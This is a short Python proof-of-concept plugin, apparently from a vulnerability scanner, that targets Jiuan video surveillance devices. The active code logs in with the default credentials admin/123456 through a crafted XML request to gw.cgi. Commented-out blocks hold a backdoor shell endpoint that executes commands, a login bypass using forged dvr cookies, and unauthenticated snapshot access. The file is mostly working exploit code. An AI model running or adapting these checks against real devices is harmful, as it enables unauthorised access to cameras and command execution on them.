import requests
from plugin.target_parse import get_standard_url
import re
import time

# 九安视频监控设备漏洞

def poc(url):
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0",
               "Referer": url,
               }
    # 后门
    # try:
    #     target = f"{get_standard_url(url)}/shell?echo%2012345678"
    #     session = requests.Session()
    #     r = session.get(target, headers=headers, proxies=proxy, timeout=10)
    #     if r.status_code == 200 and "12345678" in r.text:
    #         return target
    # except:
    #     pass
    # 弱口令
    try:
        target = f"{get_standard_url(url)}/cgi-bin/gw.cgi?xml=%3Cjuan%20ver=%22%22%20squ=%22%22%20dir=%220%22%3E%3Crpermission%20usr=%22admin%22%20pwd=%22123456%22%3E%3Cconfig%20base=%22%22/%3E%3Cplayback%20base=%22%22/%3E%3C/rpermission%3E%3C/juan%3E&_={round(time.time() * 1000)}"
        session = requests.Session()
        r = session.get(target, headers=headers, timeout=10)
        if r.status_code == 200 and len(re.findall(r"config", r.text)) > 0:
            return target
    except:
        pass
    # 登录绕过
    # try:
    #     target = f"{get_standard_url(url)}/view2.html"
    #     session = requests.Session()
    #
    #     cookies = {"dvr_pwd": "admin", "dvr_camcnt": "4", "dvr_sensorcnt": "4", "dvr_usr": "admin",
    #                "dvr_clientport": "80", "lxc_save": "admin%2Cadmin"}
    #     r = session.get(target, headers=headers, cookies=cookies, proxies=proxy, timeout=10)
    #     if r.status_code == 200:
    #         return target
    # except:
    #     pass
    # 敏感信息绕过
    # try:
    #     target = f"{get_standard_url(url)}/cgi-bin/snapshot.cgi?chn=1"
    #     session = requests.Session()
    #     r = session.get(target, headers=headers, proxies=proxy, timeout=10)
    #     if r.status_code == 200:
    #         return target
    # except:
    #     pass
    return False